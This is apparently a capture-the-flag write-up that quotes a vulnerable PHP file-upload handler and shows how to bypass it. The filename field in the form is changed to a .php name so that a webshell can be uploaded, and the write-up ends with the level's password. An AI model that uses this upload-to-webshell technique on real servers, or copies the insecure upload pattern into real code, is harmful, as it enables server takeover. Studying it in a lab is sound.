# Solution
```php
<?php  
  
function genRandomString() {    $length = 10;    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";    $string = "";  
  
    for ($p = 0; $p < $length; $p++) {        $string .= $characters[mt_rand(0, strlen($characters)-1)];  
    }  
  
    return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
    do {    $path = $dir."/".genRandomString().".".$ext;  
    } while(file_exists($path));  
    return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {    $ext = pathinfo($fn, PATHINFO_EXTENSION);  
    return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
  
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
        echo "File is too big";  
    } else {  
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
        } else{  
            echo "There was an error uploading the file, please try again!";  
        }  
    }  
} else {  
?>
```

what this means, in short is that the frontend will have a pre-appended name to the file. the backend will change that once more time, ONLY the name and not the extension.
=> If frontend's filename is changed to something with a php extension, it will keep that extension on the backend.


We can change the response to whatever as long as it is php executable:
```
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="php_webshell.php" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Upload our shell and get the password:
```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```